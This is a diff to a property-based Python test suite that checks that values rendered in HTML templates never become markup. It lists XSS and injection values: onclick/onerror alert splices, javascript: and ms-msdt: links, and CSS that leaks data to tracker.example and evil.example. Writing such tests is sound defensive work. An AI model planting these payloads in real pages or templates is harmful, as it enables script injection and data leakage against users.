@@ -1018,10 +1018,13 @@ def _reading(html: str, *, scripting: bool) -> tuple[list[tuple[Any, ...]], list
 
     The elements in document order with their attributes, and the comments; then the text of every ``style`` and
     ``script`` element. ``scripting`` reads ``noscript`` as a browser with scripting on or off does. Independent of
-    the ``html.parser`` the HTML checks are built on, so a difference between the two is what it finds.
+    the ``html.parser`` the HTML checks are built on, so a difference between the two is what it finds. The whole
+    document is read, what lies before and after its ``html`` element too.
     """
 
-    root = html5lib.HTMLParser(namespaceHTMLElements=False).parse(html, scripting=scripting)
+    root = html5lib.HTMLParser(
+        tree=html5lib.getTreeBuilder("etree", fullTree=True), namespaceHTMLElements=False,
+    ).parse(html, scripting=scripting)
     markup: list[tuple[Any, ...]] = []
     raw: list[str] = []
     for element in root.iter():
@@ -1074,6 +1077,9 @@ def _assert_value_stays_text(
                 continue
             assert [name for name, _ in after[2]] == [name for name, _ in before[2]], (before, after)
             for (name, was), (_, now) in zip(before[2], after[2], strict=True):
+                if name in LINK_ATTRIBUTES and now != was:
+                    # Judged apart from url itself: an absolute link of the four schemes, or none.
+                    assert now == "" or now.lower().startswith(SENT_SCHEMES), (before[1], name, now)
                 if name in OUTPUT_ATTRIBUTES or (
                     name in LINK_ATTRIBUTES and (was, now) == (url(_harmless(value)), url(value))
                 ):
@@ -1095,13 +1101,20 @@ class _Rows:
         return name in self.rows
 
 
+SENT_SCHEMES = ("https://", "http://", "mailto:", "tel:")
 SPLICE = "y style=color:red onclick=alert(1)"
 JAVASCRIPT = "javascript:alert(document.domain)"
 CSS = "}*{background:url(https://tracker.example/leak?)}@import url(https://evil.example/x.css);"
+CUT = "aaaaaa\nx onmouseover=alert(1) style=background:url(https://tracker.example/leak);x:"
 HOSTILE = [
     SPLICE, JAVASCRIPT, CSS, '"><b onclick=x>', "</style><b onclick=x>", "' onclick=x '", "-->", "]]>", "x\x00y",
-    "/", "/ onerror=alert(1)", ";background-image:url(https://tracker.example/leak)",
+    "/", "/ onerror=alert(1)", ";background-image:url(https://tracker.example/leak)", CUT,
+    "1;alert(document.domain)//", "ms-msdt:/id PCWDiagnostic", "//evil.example/x", "/settings/forward",
+    "\x1b$B\"><b onclick=x>", "\x00", "\x1b\x0c\x00", " ", "", "\n\n", "\U0001f600", "&amp;quot;",
+    "</title><img src=x onerror=alert(1)>",
 ]
+"""Values of every kind: attribute and element splices, schemes, CSS, a cut line break, control characters and a
+value of controls alone, white space, empty."""
 
 _ATTRIBUTE = st.builds(
     lambda gap, name, quoting, value: gap + name + quoting.format(value),
@@ -1122,20 +1135,67 @@ _PLAIN_TAG = st.builds(
     lambda tag, attributes, end: "<" + tag + "".join(attributes) + end,
     st.sampled_from(["p", "span", "a", "td", "table", "tr", "b", "div", "img", "br", "title", "style"]),
     st.lists(st.builds(
-        lambda name, value: f' {name}="{value}"',
+        lambda name, quoting, value: f" {name}" + quoting.format(value),
         st.sampled_from(["title", "alt", "href", "style", "class", "lang", "src"]),
+        st.sampled_from(['="{}"'] * 6 + ["={}", "='{}'"]),
         st.sampled_from(["x", "{{ v }}", "{{ v|url }}", "{% if v %}{{ v }}{% endif %}", "color:{{ brand.light.text }}",
                          "&amp;", ""]),
     ), max_size=2, unique_by=lambda attribute: attribute.split("=", 1)[0]),
     st.sampled_from([">", " />"]),
 )
-"""Tags spelled as the checks admit them, so that admitted compositions are drawn often enough to matter."""
+"""Tags spelled as the checks admit them, so that admitted compositions are drawn often enough to matter, a value
+now and then unquoted or single-quoted."""
+FAMILIES: list[tuple[dict[str, str], str]] = [
+    ({"before": "<script>var a = 1; {{ v }}</script>"}, "1;alert(document.domain)//"),
+    ({"before": "<svg><style>{{ v }}</style></svg>"}, CSS),
+    ({"before": "<math><mi><style>{{ v }}</style></mi></math>"}, CSS),
+    ({"before": '<frameset rows="*"><frame src="{{ v|url }}"></frameset>'}, "https://evil.example/page"),
+    ({"before": "<p title={{ v }}>x</p>"}, SPLICE),
+    ({"before": "<p title='{{ v }}'>x</p>"}, "' onclick=x '"),
+    ({"before": '<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ v }}">y</p>'},
+     ";background-image:url(https://tracker.example/leak)"),
+    ({"before": '<title>Hi</title{{ v }}><img alt={{ v }} src="https://example.test/x.png"></title>'},
+     "/ onerror=alert(1)"),
+    ({"block": "<p>Hi</p><style/>", "after": "<p>Hello {{ v }}, welcome.</p>"}, CSS),
+    ({"head": "<p>Hi</p><style/>", "after": "<p>Hello {{ v }}.</p>"}, CSS),
+    ({"block": "<p>Hi</p><style>", "after": "Hello {{ v }}, welcome."}, CSS),
+    ({"block": "<p>Hi</p><a", "after": ' href="{{ v }}" style="background:url({{ v }})">Open</a>'}, JAVASCRIPT),
+    ({"block": '<p>Hi</p><a title="x', "after": '" href="{{ v }}">Open</a>'}, JAVASCRIPT),
+    ({"before": "<p>{{ v|linebreaksbr|truncatechars:3 }} {{ v }}</p>"}, "\n" + SPLICE),
+    ({"before": '<a href="{{ v|url }}">x</a>'}, "ms-msdt:/id PCWDiagnostic"),
+    ({"head": '<meta charset="iso-2022-jp">', "before": '<p title="{{ v }}">x</p>'}, '\x1b$B"><b onclick=x>'),
+]
+"""Each family the closed lists refuse, as the row parts it takes and the value that shows what it would break: an
+element off the list holding a value, an unquoted or single-quoted output, a NUL forging a placeholder, a < in a
+title, a self-closing or unclosed style, a row ending inside a tag, a markup filter cut, a scheme off the list, a
+character set other than UTF-8."""
+
+_REFUSED = st.sampled_from([
+    # Rule 7: elements off the list, each holding a value where a reader would not read text.
+    *(f"<{tag}>{{{{ v }}}}</{tag}>" for tag in (
+        "script", "iframe", "noembed", "noframes", "xmp", "textarea", "template", "select", "plaintext", "object")),
+    "<script>var a = 1; {{ v }}</script>", "<svg><style>{{ v }}</style></svg>", "<math><mi>{{ v }}</mi></math>",
+    '<frameset rows="*"><frame src="{{ v|url }}"></frameset>',
+    # Rule 3: an output unquoted or single-quoted.
+    "<p title={{ v }}>x</p>", "<p title='{{ v }}'>x</p>", '<img alt={{ v }} src="https://example.test/a.png">',
+    # Rule 1: a literal NUL forging the placeholder of an output the style admits.
+    '<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ v }}">y</p>',
+    # Rules 2 and 6: a < inside a title that ends where a reader would not end it.
+    '<title>Hi</title{{ v }}><img alt={{ v }} src="https://example.test/x.png"></title>',
+    # Rule 4: a style closed with a slash a reader ignores.
+    "<style/><p>{{ v }}</p>",
+    # Filters: a markup filter cut by the next one.
+    *(f"<p>{{{{ v|linebreaksbr|truncatechars:{size} }}}} {{{{ v }}}}</p>" for size in (8, 9, 10)),
+    # Links and the character set.
+    '<a href="{{ v|url }}">x</a>', '<meta charset="iso-2022-jp">',
+])
+"""One piece of each family the closed lists refuse, drawn often enough that a dropped rule admits one."""
 _PLAIN = st.sampled_from([
     "</p>", "</span>", "</a>", "</b>", "</div>", "</td>", "</tr>", "</title>", "text", "{{ v }}", "&amp;", "AT&T",
     "{% if v %}{{ v }}{% endif %}",
 ])
 _HTML = st.lists(
-    st.one_of(_PLAIN_TAG, _PLAIN_TAG, _PLAIN_TAG, _PLAIN, _PLAIN, _PLAIN, _START_TAG, st.sampled_from([
+    st.one_of(_PLAIN_TAG, _PLAIN_TAG, _PLAIN_TAG, _PLAIN, _PLAIN, _PLAIN, _START_TAG, _REFUSED, st.sampled_from([
         "</style>", "</style\x0b>", "</style/>", "</table>", "</select>", '"', "'", ">", "<", "&", "&lt", "\n",
         "<!--x-->", "<!x>", "</ x>", "<?x>", "</>", "<![CDATA[x]]>", "<!doctype html>", '</p x="{{ v }}">', "<br/>",
         "</title{{ v }}>", "<style/>", "<!--[if mso]><b>x</b><![endif]-->", "{% if v %}", "{% endif %}",
@@ -1151,35 +1211,54 @@ _PART = st.one_of(st.just(""), _HTML)
     suppress_health_check=[HealthCheck.function_scoped_fixture, HealthCheck.too_slow, HealthCheck.filter_too_much],
 )
 @given(head=_PART, tail=_PART, before=_PART, block=_PART, after=_PART, value=st.one_of(
-    st.sampled_from(HOSTILE), st.text(max_size=40)))
+    st.sampled_from(HOSTILE), st.text(max_size=40)), family=st.one_of(st.none(), st.sampled_from(FAMILIES)),
+    family_value=st.booleans())
 # Rows found to break the property: a repeated attribute name and a noscript splice (S1); a row ending inside a tag
 # or a <style> (S2); a self-closing <style/>, in a block and in a layout (rule 4); template code glued to </title
 # (rule 6); a literal NUL forging a placeholder (rule 1).
-@example(head="", tail="", before='<span title="a" title={{ v }}>x</span>', block="", after="", value=SPLICE)
-@example(head="", tail="", before='<span TITLE="a" title={{ v }}>x</span>', block="", after="", value=SPLICE)
+@example(head="", tail="", before='<span title="a" title={{ v }}>x</span>', block="", after="", value=SPLICE,
+         family=None, family_value=False)
+@example(head="", tail="", before='<span TITLE="a" title={{ v }}>x</span>', block="", after="", value=SPLICE,
+         family=None, family_value=False)
 @example(head="", tail="", before='<noscript><p title="</noscript><b title={{ v }}>"></p></noscript>', block="",
-         after="", value=SPLICE)
+         after="", value=SPLICE,
+         family=None, family_value=False)
 @example(head="", tail="", before="", block="<p>Hi</p><a",
-         after=' href="{{ v }}" style="background:url({{ v }})">Open</a>', value=JAVASCRIPT)
+         after=' href="{{ v }}" style="background:url({{ v }})">Open</a>', value=JAVASCRIPT,
+         family=None, family_value=False)
 @example(head="", tail="", before="", block='<p>Hi</p><a title="x', after='" href="{{ v }}">Open</a>',
-         value=JAVASCRIPT)
-@example(head="", tail="", before="", block="<p>Hi</p><style>", after="Hello {{ v }}, welcome.", value=CSS)
-@example(head="", tail="", before="", block="<p>Hi</p><style/>", after="<p>Hello {{ v }}, welcome.</p>", value=CSS)
-@example(head="<p>Hi</p><style/>", tail="", before="", block="", after="<p>Hello {{ v }}, welcome.</p>", value=CSS)
+         value=JAVASCRIPT,
+         family=None, family_value=False)
+@example(head="", tail="", before="", block="<p>Hi</p><style>", after="Hello {{ v }}, welcome.", value=CSS,
+         family=None, family_value=False)
+@example(head="", tail="", before="", block="<p>Hi</p><style/>", after="<p>Hello {{ v }}, welcome.</p>", value=CSS,
+         family=None, family_value=False)
+@example(head="<p>Hi</p><style/>", tail="", before="", block="", after="<p>Hello {{ v }}, welcome.</p>", value=CSS,
+         family=None, family_value=False)
 @example(head="", tail="", before='<title>Hi</title{{ v }}><img alt={{ v }} src="https://example.test/x.png"></title>',
-         block="", after="<p>Body</p>", value="/ onerror=alert(1)")
+         block="", after="<p>Body</p>", value="/ onerror=alert(1)",
+         family=None, family_value=False)
 @example(head="", tail="", before='<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ v }}">y</p>',
-         block="", after="", value=";background-image:url(https://tracker.example/leak)")
+         block="", after="", value=";background-image:url(https://tracker.example/leak)",
+         family=None, family_value=False)
 def test_a_value_never_becomes_markup(
     kit: Any, head: str, tail: str, before: str, block: str, after: str, value: str,
+    family: tuple[dict[str, str], str] | None, family_value: bool,
 ) -> None:
     """Property 1, over the rows the walk admits, read as a browser reads them (html5lib).
 
     The rows meet as a layout around a template and a template around an included block, each drawn from tags in
     every quoting, spelling and whitespace of their attributes, self-closing and raw-text elements, comments,
-    declarations, entities and template code, ending anywhere.
+    declarations, entities and template code, ending anywhere. Half the compositions put one of the
+    :data:`FAMILIES` the closed lists refuse in place of the parts it names, half of those with the value that shows
+    what it would break, so that dropping any rule admits a break the generated examples alone find.
     """
 
+    if family is not None:
+        overrides, shown = family
+        parts = {"head": head, "tail": tail, "before": before, "block": block, "after": after, **overrides}
+        head, tail, before, block, after = (parts[name] for name in ("head", "tail", "before", "block", "after"))
+        value = shown if family_value else value
     template = _unsaved(
         format="html", source=before + '{% include "blocks/probe" with v=v only %}' + after, text_source="{{ v }}",
         variables={"v": "x"}, layout="probe",
